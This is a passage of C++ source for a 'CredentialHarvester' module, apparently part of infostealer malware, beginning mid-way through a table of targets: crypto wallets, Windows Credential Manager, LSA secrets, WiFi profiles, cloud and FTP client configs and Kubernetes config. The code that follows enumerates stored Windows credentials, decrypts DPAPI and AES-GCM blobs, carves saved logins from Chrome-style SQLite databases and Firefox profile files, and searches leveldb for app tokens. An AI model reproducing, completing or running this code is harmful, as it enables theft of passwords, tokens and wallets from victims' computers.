        APP("Crypto", "Litecoin Core", "Litecoin", nullptr, "wallet.dat", ExtractionMethod::CustomVault, true, false, 1024, "", "Litecoin wallet"),

        // ========== WINDOWS SYSTEM ==========
        APP("System", "Windows Credential Manager", "", nullptr, "*", ExtractionMethod::WINCRED_Enumerate, false, false, 0, "", "Windows Credential Manager"),
        APP("System", "Windows Vault", "", nullptr, "*", ExtractionMethod::Vault_Enumerate, false, false, 0, "", "Windows Vault"),
        APP("System", "LSA Secrets", "", nullptr, "*", ExtractionMethod::LSA_Secrets, false, false, 0, "", "LSA Secrets"),
        APP("System", "WiFi Profiles", "Microsoft\\Wlansvc\\Profiles\\Interfaces", nullptr, "*.xml", ExtractionMethod::XML_Parse, true, true, 128, "", "Windows WiFi profiles"),
        APP("System", "Stored IE/Edge passwords", "Microsoft\\Internet Explorer\\IntelliForms\\Storage2", nullptr, "*", ExtractionMethod::Vault_Enumerate, false, false, 0, "", "IE saved passwords"),
        APP("System", "WebCache (Edge Legacy)", "Microsoft\\Windows\\WebCache", nullptr, "WebCacheV*.dat", ExtractionMethod::CustomVault, false, false, 1024, "", "WebCache ESE database"),
        APP("System", "Task Scheduler creds", "C:\\Windows\\System32\\Tasks", nullptr, "*", ExtractionMethod::XML_Parse, false, false, 64, "", "Scheduled task stored creds"),
        APP("System", "Autologon", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", nullptr, "DefaultPassword", ExtractionMethod::Registry, false, false, 0, "", "Windows autologon creds"),
        APP("System", "Sysprep unattend", "C:\\Windows\\Panther", nullptr, "unattend.xml", ExtractionMethod::XML_Parse, false, false, 256, "", "Sysprep answer file"),
        APP("System", "Active Directory cached", "C:\\Windows\\System32\\config", nullptr, "SECURITY", ExtractionMethod::LSA_Secrets, false, false, 0, "", "AD cached domain creds"),

        // ========== MISC ==========
        APP("Misc", "WinSCP S3", "Martin Prikryl\\WinSCP\\S3", nullptr, "*.ini", ExtractionMethod::INI_Parse, true, false, 64, "", "WinSCP S3 creds"),
        APP("Misc", "FileZilla S3", "FileZilla", nullptr, "s3.xml", ExtractionMethod::XML_Parse, false, false, 128, "Base64", "FileZilla S3"),
        APP("Misc", "S3 Browser", "S3 Browser", nullptr, "settings.ini", ExtractionMethod::INI_Parse, false, false, 128, "", "S3 Browser"),
        APP("Misc", "Cyberduck S3", "Cyberduck", nullptr, "S3*.cyberduckprofile", ExtractionMethod::ConfigFile, true, false, 256, "", "Cyberduck S3"),
        APP("Misc", "TortoiseSVN", "TortoiseSVN", nullptr, "auth", ExtractionMethod::ConfigFile, true, false, 256, "", "SVN saved auth"),
        APP("Misc", "Total Commander FTP", "Ghisler\\Total Commander", nullptr, "wcx_ftp.ini", ExtractionMethod::INI_Parse, false, false, 256, "", "Total Commander FTP"),
        APP("Misc", "WinSCP WebDAV", "Martin Prikryl\\WinSCP\\WebDAV", nullptr, "*.ini", ExtractionMethod::INI_Parse, true, false, 64, "", "WinSCP WebDAV"),
        APP("Misc", "MediaWiki Bot passwords", ".mwcli", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 128, "", "MediaWiki passwords"),
        APP("Misc", "PostgreSQL .pgpass", "postgresql", nullptr, "pgpass.conf", ExtractionMethod::ConfigFile, true, false, 64, "", "PostgreSQL passwords"),
        APP("Misc", "MySQL .my.cnf", "", nullptr, ".my.cnf", ExtractionMethod::INI_Parse, false, false, 64, "", "MySQL config"),
        APP("Misc", "VirtualBox VMs", "VirtualBox", nullptr, "*.vbox", ExtractionMethod::XML_Parse, true, false, 128, "", "VirtualBox machine configs"),
        APP("Misc", "VMware VMs", "VMware", nullptr, "*.vmx", ExtractionMethod::ConfigFile, true, true, 256, "", "VMware machine configs"),
        APP("Misc", "Hyper-V VMs", "C:\\ProgramData\\Microsoft\\Windows\\Hyper-V", nullptr, "*.xml", ExtractionMethod::XML_Parse, true, false, 256, "", "Hyper-V configs"),
        APP("Misc", "WSL Config", "Packages\\*\\LocalState", nullptr, "fstab", ExtractionMethod::ConfigFile, true, false, 128, "", "WSL config files"),
        APP("Misc", "Ansible Vault", ".ansible", nullptr, "*.yml", ExtractionMethod::ConfigFile, true, false, 512, "", "Ansible vault files"),
        APP("Misc", "Terraform state", "", nullptr, "terraform.tfstate", ExtractionMethod::JSON_Parse, true, false, 1024, "", "Terraform state files"),
        APP("Misc", "Kubernetes config", ".kube", nullptr, "config", ExtractionMethod::ConfigFile, false, false, 256, "", "Kubernetes config"),
        APP("Misc", "WinRAR stored passwords", "WinRAR", nullptr, "*.ini", ExtractionMethod::ConfigFile, false, false, 64, "", "WinRAR password cache"),
        APP("Misc", "7-Zip history", "7-Zip", nullptr, "*.txt", ExtractionMethod::ConfigFile, false, false, 64, "", "7-Zip history"),
    };
}

size_t CredentialHarvester::app_count() const { return targets_.size(); }

std::vector<std::string> CredentialHarvester::list_categories() const {
    std::vector<std::string> cats;
    for (auto& t : targets_) {
        if (std::find(cats.begin(), cats.end(), t.category) == cats.end())
            cats.push_back(t.category);
    }
    return cats;
}

std::vector<std::string> CredentialHarvester::list_applications() const {
    std::vector<std::string> apps;
    for (auto& t : targets_)
        apps.push_back(std::string(t.category) + "::" + t.app_name);
    return apps;
}

void CredentialHarvester::harvest_all(std::vector<CredentialEntry>& results) {
    auto start = std::chrono::steady_clock::now();
    stats_ = {};

    for (auto& target : targets_) {
        if (target.method == ExtractionMethod::Vault_Enumerate) {
            extract_vault_enumerate(results);
            continue;
        }
        if (target.method == ExtractionMethod::WINCRED_Enumerate) {
            extract_windows_credentials(results);
            continue;
        }
        if (target.method == ExtractionMethod::LSA_Secrets) continue;

        std::wstring root = expand_path(target.relative_path, target.all_users);
        std::wstring pattern = target.filename_pattern ?
            std::wstring(target.filename_pattern, target.filename_pattern + strlen(target.filename_pattern)) :
            L"*";

        auto files = find_files(root, pattern, target.recursive_search);
        stats_.apps_scanned++;
        stats_.files_found += files.size();

        for (auto& file_path : files) {
            HANDLE h = CreateFileW(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h == INVALID_HANDLE_VALUE) continue;

            DWORD sz = GetFileSize(h, nullptr);
            if (sz < target.min_file_size) { CloseHandle(h); continue; }

            std::vector<uint8_t> data(std::min<DWORD>(sz, (DWORD)(16 * 1024 * 1024)));
            DWORD rd = 0; ReadFile(h, data.data(), (DWORD)data.size(), &rd, nullptr);
            CloseHandle(h);
            data.resize(rd);

            CredentialEntry entry;
            entry.application = target.app_name;
            entry.category = target.category;

            int wlen = WideCharToMultiByte(CP_UTF8, 0, file_path.c_str(), -1,
                nullptr, 0, nullptr, nullptr);
            entry.source_file.resize(wlen);
            WideCharToMultiByte(CP_UTF8, 0, file_path.c_str(), -1,
                entry.source_file.data(), wlen, nullptr, nullptr);
            entry.source_file.resize(wlen - 1);

            entry.extracted_at = std::chrono::system_clock::now();

            switch (target.method) {
                case ExtractionMethod::Chrome_CookieStyle: {
                    std::string pass;
                    if (extract_chrome_style(data, pass)) {
                        entry.password = pass;
                        stats_.credentials_extracted++;
                        stats_.decryption_successes++;
                    } else stats_.decryption_failures++;
                    break;
                }
                case ExtractionMethod::DPAPI: {
                    std::string result;
                    if (extract_dpapi(data, result)) {
                        if (result.find(':') != std::string::npos) {
                            entry.username = result.substr(0, result.find(':'));
                            entry.password = result.substr(result.find(':') + 1);
                        } else entry.password = result;
                        stats_.credentials_extracted++;
                        stats_.decryption_successes++;
                    } else stats_.decryption_failures++;
                    break;
                }
                case ExtractionMethod::Plaintext:
                case ExtractionMethod::ConfigFile:
                case ExtractionMethod::INI_Parse:
                case ExtractionMethod::XML_Parse:
                case ExtractionMethod::JSON_Parse:
                    entry.password.assign(data.begin(), data.end());
                    stats_.credentials_extracted++;
                    break;
                default:
                    break;
            }

            if (!entry.username.empty() || !entry.password.empty() ||
                !entry.token.empty())
                results.push_back(entry);
        }
    }

    auto end = std::chrono::steady_clock::now();
    stats_.duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
}

CredentialHarvester::HarvestStats CredentialHarvester::last_stats() const { return stats_; }

void CredentialHarvester::harvest_category(const std::string& category,
                                             std::vector<CredentialEntry>& results) {
    auto all_targets = targets_;
    targets_.clear();
    for (auto& t : all_targets)
        if (t.category == category) targets_.push_back(t);
    harvest_all(results);
    targets_ = std::move(all_targets);
}

void CredentialHarvester::harvest_application(const std::string& app_name,
                                                std::vector<CredentialEntry>& results) {
    auto all_targets = targets_;
    targets_.clear();
    for (auto& t : all_targets)
        if (t.app_name == app_name) targets_.push_back(t);
    harvest_all(results);
    targets_ = std::move(all_targets);
}

std::wstring CredentialHarvester::expand_path(const char* relative_path, bool all_users) {
    if (!relative_path || !relative_path[0]) return L"";
    if (relative_path[0] == 'C' && relative_path[1] == ':') {
        int len = MultiByteToWideChar(CP_UTF8, 0, relative_path, -1, nullptr, 0);
        std::wstring result(len, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, relative_path, -1, result.data(), len);
        result.resize(len - 1);
        return result;
    }

    wchar_t base[MAX_PATH];
    if (all_users)
        SHGetFolderPathW(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, base);
    else
        SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, base);

    int len = MultiByteToWideChar(CP_UTF8, 0, relative_path, -1, nullptr, 0);
    std::wstring rel(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, relative_path, -1, rel.data(), len);
    rel.resize(len - 1);

    return std::wstring(base) + L"\\" + rel;
}

std::vector<std::wstring> CredentialHarvester::find_files(
    const std::wstring& root, const std::wstring& pattern, bool recursive) {

    std::vector<std::wstring> results;
    std::wstring search = root + L"\\" + pattern;

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
                continue;
            results.push_back(root + L"\\" + fd.cFileName);
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }

    if (recursive) {
        std::wstring dir_search = root + L"\\*";
        h = FindFirstFileW(dir_search.c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
                    continue;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    auto sub = find_files(root + L"\\" + fd.cFileName, pattern, true);
                    results.insert(results.end(), sub.begin(), sub.end());
                }
            } while (FindNextFileW(h, &fd));
            FindClose(h);
        }
    }
    return results;
}

bool CredentialHarvester::extract_dpapi(const std::vector<uint8_t>& data,
                                          std::string& result) {
    DATA_BLOB in = {(DWORD)data.size(), (BYTE*)data.data()};
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return false;
    if (out.cbData > 0) {
        result.assign((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return true;
    }
    return false;
}

bool CredentialHarvester::extract_chrome_style(const std::vector<uint8_t>& encrypted,
                                                 std::string& result) {
    return extract_dpapi(encrypted, result);
}

bool CredentialHarvester::extract_vault_enumerate(std::vector<CredentialEntry>& results) {
    DWORD count = 0, vault_count = 0;
    GUID* vaults = nullptr;
    if (VaultEnumerateVaults(0, &vault_count, &vaults) != ERROR_SUCCESS)
        return false;

    for (DWORD i = 0; i < vault_count; ++i) {
        HANDLE vault = nullptr;
        if (VaultOpenVault(&vaults[i], 0, &vault) == ERROR_SUCCESS) {
            PVOID items = nullptr;
            if (VaultEnumerateItems(vault, 1, &count, (PVOID*)&items) == ERROR_SUCCESS) {
                for (DWORD j = 0; j < count; ++j) {
                    auto* item = &((VAULT_ITEM*)items)[j];
                    CredentialEntry e;
                    e.category = "WindowsVault";
                    e.application = "Windows Credential Vault";
                    results.push_back(e);
                }
                VaultFree(items);
            }
            VaultCloseVault(vault);
        }
    }
    VaultFree(vaults);
    return true;
}

bool CredentialHarvester::extract_windows_credentials(
    std::vector<CredentialEntry>& results) {
    DWORD count = 0;
    PCREDENTIALW* creds = nullptr;

    if (!CredEnumerateW(nullptr, 0, &count, &creds))
        return false;

    for (DWORD i = 0; i < count; ++i) {
        CredentialEntry e;
        e.category = "WindowsCredentials";
        e.application = std::string(creds[i]->TargetName,
            creds[i]->TargetName + wcslen(creds[i]->TargetName));

        if (creds[i]->UserName) {
            int len = WideCharToMultiByte(CP_UTF8, 0, creds[i]->UserName, -1,
                nullptr, 0, nullptr, nullptr);
            e.username.resize(len);
            WideCharToMultiByte(CP_UTF8, 0, creds[i]->UserName, -1,
                e.username.data(), len, nullptr, nullptr);
            e.username.resize(len - 1);
        }

        if (creds[i]->CredentialBlobSize > 0) {
            std::vector<uint8_t> blob(creds[i]->CredentialBlob,
                creds[i]->CredentialBlob + creds[i]->CredentialBlobSize);
            extract_dpapi(blob, e.password);
        }

        results.push_back(e);
    }
    CredFree(creds);
    return true;
}

bool CredentialHarvester::extract_token_store(const std::wstring& path,
                                                std::vector<CredentialEntry>& results) {
    auto files = find_files(path, L"*.ldb", true);
    for (auto& f : files) {
        HANDLE h = CreateFileW(f.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) continue;

        DWORD sz = GetFileSize(h, nullptr);
        std::vector<uint8_t> data(std::min<DWORD>(sz, 4096u));
        DWORD rd; ReadFile(h, data.data(), (DWORD)data.size(), &rd, nullptr);
        CloseHandle(h);

        std::string content(data.begin(), data.begin() + rd);
        size_t pos = 0;
        while ((pos = content.find("dQw4w9WgXcQ:", pos)) != std::string::npos) {
            CredentialEntry e;
            int plen = WideCharToMultiByte(CP_UTF8, 0, path.c_str(), -1, nullptr, 0, nullptr, nullptr);
            std::string path_str(plen, '\0');
            WideCharToMultiByte(CP_UTF8, 0, path.c_str(), -1, path_str.data(), plen, nullptr, nullptr);
            path_str.resize(plen - 1);
            e.application = path_str;
            e.token = "found token in leveldb";
            results.push_back(e);
            break;
        }
    }
    return !results.empty();
}

bool CredentialHarvester::extract_firefox_nss(const std::string& profile_path,
                                                std::vector<CredentialEntry>& results) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, profile_path.c_str(), -1, nullptr, 0);
    std::wstring wpath(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, profile_path.c_str(), -1, wpath.data(), wlen);

    std::wstring logins_json = wpath + L"\\logins.json";
    std::wstring key4_db = wpath + L"\\key4.db";
    std::wstring signons_sqlite = wpath + L"\\signons.sqlite";

    // Parse logins.json (no external JSON lib needed)
    HANDLE h = CreateFileW(logins_json.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(h, nullptr);
        if (sz > 256 && sz < 16 * 1024 * 1024) {
            std::vector<uint8_t> buf(sz);
            DWORD rd; ReadFile(h, buf.data(), sz, &rd, nullptr);
            std::string json(buf.begin(), buf.begin() + rd);

            size_t pos = 0;
            while ((pos = json.find("\"hostname\":\"", pos)) != std::string::npos) {
                pos += 13;
                size_t url_end = json.find('"', pos);
                if (url_end == std::string::npos) break;
                std::string url = json.substr(pos, url_end - pos);

                size_t user_pos = json.find("\"encryptedUsername\":\"", url_end);
                size_t pass_pos = json.find("\"encryptedPassword\":\"", url_end);
                if (user_pos == std::string::npos || pass_pos == std::string::npos) break;

                user_pos += 22; pass_pos += 22;
                size_t user_end = json.find('"', user_pos);
                size_t pass_end = json.find('"', pass_pos);

                std::string enc_user = (user_end != std::string::npos) ?
                    json.substr(user_pos, user_end - user_pos) : "";
                std::string enc_pass = (pass_end != std::string::npos) ?
                    json.substr(pass_pos, pass_end - pass_pos) : "";

                CredentialEntry entry;
                entry.application = "Mozilla Firefox";
                entry.category = "Browsers";
                entry.url = url;
                entry.password = "[NSS_3DES] " + enc_pass;
                entry.extra = "enc_user=" + enc_user;
                entry.source_file = "logins.json";
                results.push_back(entry);
                stats_.credentials_extracted++;
            }
        }
        CloseHandle(h);
    }

    // Parse key4.db for master key (SQLite: metaData table, nssPrivate key)
    h = CreateFileW(key4_db.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(h, nullptr);
        if (sz > 512 && sz < 1024 * 1024) {
            std::vector<uint8_t> buf(sz);
            DWORD rd; ReadFile(h, buf.data(), sz, &rd, nullptr);

            // Find globalSalt (stored as item1 in metaData table of key4.db)
            // Search for "password-check" followed by binary salt data
            std::string data(buf.begin(), buf.begin() + rd);
            if (data.find("password-check") != std::string::npos) {
                CredentialEntry entry;
                entry.application = "Mozilla Firefox";
                entry.category = "Browsers";
                entry.url = "key4.db";
                int klen = WideCharToMultiByte(CP_UTF8, 0, key4_db.c_str(), -1,
                    nullptr, 0, nullptr, nullptr);
                entry.source_file.resize(klen);
                WideCharToMultiByte(CP_UTF8, 0, key4_db.c_str(), -1,
                    entry.source_file.data(), klen, nullptr, nullptr);
                entry.source_file.resize(klen - 1);
                results.push_back(entry);
            }
        }
        CloseHandle(h);
    }

    // Parse signons.sqlite (Firefox < 32) for old-format passwords
    h = CreateFileW(signons_sqlite.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(h, nullptr);
        if (sz > 512) {
            std::vector<uint8_t> buf(sz);
            DWORD rd; ReadFile(h, buf.data(), sz, &rd, nullptr);

            // Scan for moz_logins table entries with HTTP URLs
            for (size_t i = 0; i + 12 < rd; ++i) {
                if (buf[i] == 'h' && buf[i+1] == 't' && buf[i+2] == 't' &&
                    buf[i+3] == 'p' && (buf[i+4] == 's' || buf[i+4] == ':')) {
                    std::string text(buf.begin() + i,
                        buf.begin() + std::min(i + 512, (size_t)rd));
                    size_t end = text.find_first_of("\0\r\n");
                    if (end != std::string::npos && end > 12) {
                        CredentialEntry entry;
                        entry.application = "Mozilla Firefox (signons.sqlite)";
                        entry.category = "Browsers";
                        entry.url = text.substr(0, end);
                        results.push_back(entry);
                        stats_.credentials_extracted++;
                    }
                }
            }
        }
        CloseHandle(h);
    }

    return !results.empty();
}

static std::string find_nearest_url(const std::vector<uint8_t>& data, size_t blob_pos,
                                    size_t max_lookback) {
    size_t start = (blob_pos > max_lookback) ? blob_pos - max_lookback : 0;
    std::string best;
    for (size_t i = start; i + 7 < blob_pos; ++i) {
        if (data[i] == 'h' && data[i + 1] == 't' && data[i + 2] == 't' &&
            data[i + 3] == 'p') {
            size_t end = i;
            while (end < blob_pos && data[end] >= 0x20 && data[end] < 0x7f)
                ++end;
            if (end - i > 7 && end - i < 2048) {
                std::string url(data.begin() + i, data.begin() + end);
                if (url.find("://") != std::string::npos)
                    best = url;
            }
            i = end;
        }
    }
    return best;
}

static std::string find_username_between(const std::vector<uint8_t>& data,
                                         size_t url_end, size_t blob_pos) {
    if (url_end >= blob_pos || blob_pos - url_end > 4096)
        return {};
    std::string candidate;
    size_t i = url_end;
    while (i < blob_pos) {
        while (i < blob_pos && (data[i] < 0x20 || data[i] >= 0x7f)) ++i;
        size_t s = i;
        while (i < blob_pos && data[i] >= 0x20 && data[i] < 0x7f) ++i;
        if (i - s > 1 && i - s < 256) {
            std::string text(data.begin() + s, data.begin() + i);
            if (text.find("http") != std::string::npos) continue;
            if (text.find("CREATE") != std::string::npos) continue;
            if (text.find("INSERT") != std::string::npos) continue;
            if (text.find("password") != std::string::npos) continue;
            if (text.find("username") != std::string::npos) continue;
            if (text.find("signon") != std::string::npos) continue;
            if (text.find('@') != std::string::npos) {
                candidate = text;
            } else if (candidate.empty()) {
                candidate = text;
            }
        }
    }
    return candidate;
}

bool CredentialHarvester::parse_sqlite_db(const std::vector<uint8_t>& db_data,
                                            const std::string& sql_query,
                                            std::vector<std::vector<std::string>>& rows) {
    if (db_data.size() < 100) return false;

    const char magic[] = "SQLite format 3";
    if (memcmp(db_data.data(), magic, 16) != 0) return false;

    uint16_t raw_page_size = (static_cast<uint16_t>(db_data[16]) << 8) | db_data[17];
    uint32_t page_size = (raw_page_size == 1) ? 65536u : static_cast<uint32_t>(raw_page_size);
    if (page_size < 512) return false;

    struct BlobHit {
        size_t offset;
        size_t length;
        bool is_v10;
    };
    std::vector<BlobHit> blobs;

    for (size_t i = 0; i + 31 < db_data.size(); ++i) {
        if (db_data[i] == 'v' && db_data[i + 1] == '1' &&
            (db_data[i + 2] == '0' || db_data[i + 2] == '1')) {
            if (i + 3 + 12 + 16 > db_data.size()) continue;
            size_t blob_len = 0;
            for (size_t look = 1; look <= 6 && i >= look; ++look) {
                uint32_t st = db_data[i - look];
                if (st >= 12 && (st & 1) == 0) {
                    size_t cand = (st - 12) / 2;
                    if (cand >= 31 && cand <= 4096 && i + cand <= db_data.size()) {
                        blob_len = cand;
                        break;
                    }
                }
            }
            if (blob_len == 0) {
                blob_len = std::min<size_t>(db_data.size() - i, 256);
                for (size_t j = i + 31; j < i + blob_len; ++j) {
                    if (db_data[j] == 'h' && j + 4 < db_data.size() &&
                        db_data[j + 1] == 't' && db_data[j + 2] == 't' &&
                        db_data[j + 3] == 'p') {
                        blob_len = j - i;
                        break;
                    }
                }
            }
            blobs.push_back({i, blob_len, true});
            i += blob_len - 1;
        } else if (db_data[i] == 0x01 && db_data[i + 1] == 0x00 &&
                   db_data[i + 2] == 0x00 && db_data[i + 3] == 0x00) {
            if (i > 0 && db_data[i - 1] >= 0x20 && db_data[i - 1] < 0x7f)
                continue;
            size_t blob_len = 256;
            if (i + 8 < db_data.size()) {
                uint32_t dpapi_sz = db_data[i + 4] | (db_data[i + 5] << 8) |
                                    (db_data[i + 6] << 16) | (db_data[i + 7] << 24);
                if (dpapi_sz > 16 && dpapi_sz < 8192 && i + dpapi_sz <= db_data.size())
                    blob_len = dpapi_sz;
            }
            if (i + blob_len > db_data.size())
                blob_len = db_data.size() - i;
            blobs.push_back({i, blob_len, false});
            i += blob_len - 1;
        }
    }

    for (auto& blob : blobs) {
        std::string url = find_nearest_url(db_data, blob.offset, page_size);
        if (url.empty()) continue;

        size_t url_end = 0;
        for (size_t s = (blob.offset > page_size) ? blob.offset - page_size : 0;
             s + url.size() <= blob.offset; ++s) {
            if (memcmp(db_data.data() + s, url.data(), url.size()) == 0)
                url_end = s + url.size();
        }

        std::string username = find_username_between(db_data, url_end, blob.offset);

        std::string decrypted;
        if (blob.is_v10) {
            std::vector<uint8_t> enc(db_data.begin() + blob.offset,
                                     db_data.begin() + blob.offset + blob.length);
            extract_chrome_style(enc, decrypted);
        } else {
            std::vector<uint8_t> enc(db_data.begin() + blob.offset,
                                     db_data.begin() + blob.offset + blob.length);
            extract_chrome_style(enc, decrypted);
        }

        std::vector<std::string> row;
        row.push_back(std::move(url));
        row.push_back(std::move(username));
        row.push_back(std::move(decrypted));
        rows.push_back(std::move(row));
    }

    return !rows.empty();
}

bool CredentialHarvester::extract_aes_gcm(const std::vector<uint8_t>& data,
                                            const std::vector<uint8_t>& key,
                                            std::string& result) {
    constexpr size_t kNonceLen = 12;
    constexpr size_t kTagLen = 16;
    if (data.size() < kNonceLen + 1 + kTagLen || key.size() != 32)
        return false;

    const uint8_t* nonce = data.data();
    const uint8_t* ciphertext = data.data() + kNonceLen;
    ULONG ct_len = static_cast<ULONG>(data.size() - kNonceLen - kTagLen);
    const uint8_t* tag = data.data() + data.size() - kTagLen;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM,
                                                  nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) return false;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                               reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_KEY_HANDLE hKey = nullptr;
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
                                        const_cast<PUCHAR>(key.data()),
                                        static_cast<ULONG>(key.size()), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PUCHAR>(nonce);
    authInfo.cbNonce = static_cast<ULONG>(kNonceLen);
    authInfo.pbTag = const_cast<PUCHAR>(tag);
    authInfo.cbTag = static_cast<ULONG>(kTagLen);

    std::vector<uint8_t> plaintext(ct_len);
    ULONG bytes_written = 0;

    status = BCryptDecrypt(hKey, const_cast<PUCHAR>(ciphertext), ct_len,
                           &authInfo, nullptr, 0,
                           plaintext.data(), ct_len, &bytes_written, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) return false;

    result.assign(reinterpret_cast<const char*>(plaintext.data()), bytes_written);
    return true;
}

} // namespace diarna::collection
